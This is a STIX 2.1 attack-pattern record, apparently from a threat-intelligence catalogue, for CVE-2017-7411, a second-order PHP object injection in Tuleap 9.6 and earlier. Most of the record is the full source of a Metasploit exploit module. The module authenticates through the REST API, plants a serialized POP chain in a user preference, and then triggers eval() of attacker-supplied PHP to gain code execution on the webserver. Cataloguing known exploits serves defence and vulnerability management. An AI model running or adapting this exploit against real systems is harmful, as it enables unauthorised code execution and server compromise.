{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d56aad2d-12e7-4e7d-aedb-07db74caa97d",
    "created": "2024-08-14T17:12:57.76263Z",
    "modified": "2024-08-14T17:12:57.762635Z",
    "name": "Tuleap 9.6 Second-Order PHP Object Injection",
    "description": " This module exploits a Second-Order PHP Object Injection vulnerability in Tuleap <= 9.6 which could be abused by authenticated users to execute arbitrary PHP code with the permissions of the webserver. The vulnerability exists because of the User::getRecentElements() method is using the unserialize() function with data that can be arbitrarily manipulated by a user through the REST API interface. The exploit's POP chain abuses the __toString() method from the Mustache class to reach a call to eval() in the Transition_PostActionSubFactory::fetchPostActions() method. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tuleap_rest_unserialize_exec.rb",
            "external_id": "tuleap_rest_unserialize_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2017-02"
        },
        {
            "source_name": "reference",
            "url": "https://tuleap.net/plugins/tracker/?aid=10118"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7411"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Tuleap 9.6 Second-Order PHP Object Injection',\n      'Description'    => %q{\n        This module exploits a Second-Order PHP Object Injection vulnerability in Tuleap <= 9.6 which\n        could be abused by authenticated users to execute arbitrary PHP code with the permissions of the\n        webserver. The vulnerability exists because of the User::getRecentElements() method is using the\n        unserialize() function with data that can be arbitrarily manipulated by a user through the REST\n        API interface. The exploit's POP chain abuses the __toString() method from the Mustache class\n        to reach a call to eval() in the Transition_PostActionSubFactory::fetchPostActions() method.\n      },\n      'Author'         => 'EgiX',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://karmainsecurity.com/KIS-2017-02'],\n          ['URL', 'https://tuleap.net/plugins/tracker/?aid=10118'],\n          ['CVE', '2017-7411']\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [ ['Tuleap <= 9.6', {}] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-10-23'\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, \"The base path to the web application\", \"/\"]),\n          OptString.new('USERNAME', [true, \"The username to authenticate with\" ]),\n          OptString.new('PASSWORD', [true, \"The password to authenticate with\" ]),\n          OptInt.new('AID', [ false, \"The Artifact ID you have access to\", \"1\"]),\n          Opt::RPORT(443)\n        ])\n  end\n\n  def setup_popchain(random_param)\n    print_status(\"Trying to login through the REST API...\")\n\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'api/tokens'),\n      'ctype'     => 'application/json',\n      'data'      => {'username' => user, 'password' => pass}.to_json\n    })\n\n    unless res && (res.code == 201 || res.code == 200) && res.body\n      msg = \"Login failed with #{user}:#{pass}\"\n      print_error(msg) if @is_check\n      fail_with(Failure::NoAccess, msg)\n    end\n\n    body  = JSON.parse(res.body)\n    uid   = body['user_id']\n    token = body['token']\n\n    print_good(\"Login successful with #{user}:#{pass}\")\n    print_status(\"Updating user preference with POP chain string...\")\n\n    php_code = \"null;eval(base64_decode($_POST['#{random_param}']));//\"\n\n    pop_chain =  'a:1:{i:0;a:1:{'\n    pop_chain << 's:2:\"id\";O:8:\"Mustache\":2:{'\n    pop_chain << 'S:12:\"\\00*\\00_template\";'\n    pop_chain << 's:42:\"{{#fetchPostActions}}{{/fetchPostActions}}\";'\n    pop_chain << 'S:11:\"\\00*\\00_context\";a:1:{'\n    pop_chain << 'i:0;O:34:\"Transition_PostAction_FieldFactory\":1:{'\n    pop_chain << 'S:23:\"\\00*\\00post_actions_classes\";a:1:{'\n    pop_chain << \"i:0;s:#{php_code.length}:\\\"#{php_code}\\\";}}}}}}\"\n\n    pref = {'id' => uid, 'preference' => {'key' => 'recent_elements', 'value' => pop_chain}}\n\n    res = send_request_cgi({\n      'method'    => 'PATCH',\n      'uri'       => normalize_uri(target_uri.path, \"api/users/#{uid}/preferences\"),\n      'ctype'     => 'application/json',\n      'headers'   => {'X-Auth-Token' => token, 'X-Auth-UserId' => uid},\n      'data'      => pref.to_json\n    })\n\n    unless res && res.code == 200\n      msg = \"Something went wrong\"\n      print_error(msg) if @is_check\n      fail_with(Failure::UnexpectedReply, msg)\n    end\n  end\n\n  def do_login\n    print_status(\"Retrieving the CSRF token for login...\")\n\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, 'account/login.php')\n    })\n\n    if res && res.code == 200 && res.body && res.get_cookies\n      if res.body =~ /name=\"challenge\" value=\"(\\w+)\">/\n        csrf_token = $1\n        print_good(\"CSRF token: #{csrf_token}\")\n      else\n        print_warning(\"CSRF token not found. Trying to login without it...\")\n      end\n    else\n      msg = \"Failed to retrieve the login page\"\n      print_error(msg) if @is_check\n      fail_with(Failure::NoAccess, msg)\n    end\n\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'cookie'    => res.get_cookies,\n      'uri'       => normalize_uri(target_uri.path, 'account/login.php'),\n      'vars_post' => {'form_loginname' => user, 'form_pw' => pass, 'challenge' => csrf_token}\n    })\n\n    unless res && res.code == 302\n      msg = \"Login failed with #{user}:#{pass}\"\n      print_error(msg) if @is_check\n      fail_with(Failure::NoAccess, msg)\n    end\n\n    print_good(\"Login successful with #{user}:#{pass}\")\n    res.get_cookies\n  end\n\n  def exec_php(php_code)\n    random_param = rand_text_alpha(10)\n\n    setup_popchain(random_param)\n    session_cookies = do_login()\n\n    print_status(\"Triggering the POP chain...\")\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, \"plugins/tracker/?aid=#{datastore['AID']}\"),\n      'cookie'    => session_cookies,\n      'vars_post' => {random_param => Rex::Text.encode_base64(php_code)}\n    })\n\n    if res && res.code == 200 && res.body =~ /Exiting with Error/\n      msg = \"No access to Artifact ID #{datastore['AID']}\"\n      @is_check ? print_error(msg) : fail_with(Failure::NoAccess, msg)\n    end\n\n    res\n  end\n\n  def check\n    @is_check = true\n    flag = rand_text_alpha(rand(10)+20)\n    res  = exec_php(\"print '#{flag}';\")\n\n    if res && res.code == 200 && res.body =~ /#{flag}/\n      return Exploit::CheckCode::Vulnerable\n    elsif res && res.body =~ /Exiting with Error/\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    @is_check = false\n    exec_php(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-23",
    "x_mitre_platforms": [
        "['php']"
    ]
}